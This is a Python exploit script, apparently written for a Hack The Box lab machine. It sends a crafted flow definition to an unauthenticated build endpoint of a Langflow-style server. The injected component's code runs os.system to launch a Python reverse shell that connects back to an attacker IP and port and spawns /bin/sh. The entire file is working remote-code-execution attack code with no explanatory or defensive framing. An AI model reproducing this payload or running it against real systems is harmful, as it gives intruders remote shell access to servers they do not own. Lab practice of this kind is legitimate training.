#!/usr/bin/env python3
import requests
import json
import sys
import time

target = "https://flow.fireflow.htb"
flow_id = "7d84d636-af65-42e4-ac38-26e867052c25"
client_id = "2e0be989-4e86-474a-b7a2-bff1f45117ae"
attacker_ip = "10.10.16.8"
attacker_port = "4444"

# Python reverse shell (more reliable than bash)
python_rev = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{attacker_ip}",{attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''

payload = {
    "data": {
        "nodes": [{
            "id": "Evil",
            "type": "genericNode",
            "position": {"x": 0, "y": 0},
            "data": {
                "id": "Evil",
                "type": "EvilComp",
                "node": {
                    "template": {
                        "code": {
                            "type": "code",
                            "required": True,
                            "show": True,
                            "multiline": True,
                            "value": f'''import os
os.system("python3 -c '{python_rev}'")

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class EvilComp(Component):
    display_name="Evil-X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={{}})''',
                            "name": "code",
                            "password": False,
                            "advanced": False,
                            "dynamic": False
                        },
                        "_type": "Component"
                    },
                    "description": "Evil-X",
                    "base_classes": ["Data"],
                    "display_name": "EvilComp",
                    "name": "EvilComp",
                    "frozen": False,
                    "outputs": [{
                        "types": ["Data"],
                        "selected": "Data",
                        "name": "o",
                        "display_name": "O",
                        "method": "r",
                        "value": "UNDEFINED",
                        "cache": True,
                        "allows_loop": False,
                        "tool_mode": False,
                        "hidden": None,
                        "required_inputs": None,
                        "group_outputs": False
                    }],
                    "field_order": ["code"],
                    "beta": False,
                    "edited": False
                }
            }
        }],
        "edges": []
    }
}

print("[*] Sending Python reverse shell exploit...")
try:
    response = requests.post(
        f"{target}/api/v1/build_public_tmp/{flow_id}/flow",
        json=payload,
        headers={"Content-Type": "application/json"},
        cookies={"client_id": client_id},
        verify=False,
        timeout=30
    )
    
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text[:200]}")
    
except requests.exceptions.Timeout:
    print("[+] Request timed out - This is good! Shell should have connected!")
except Exception as e:
    print(f"[-] Error: {e}")
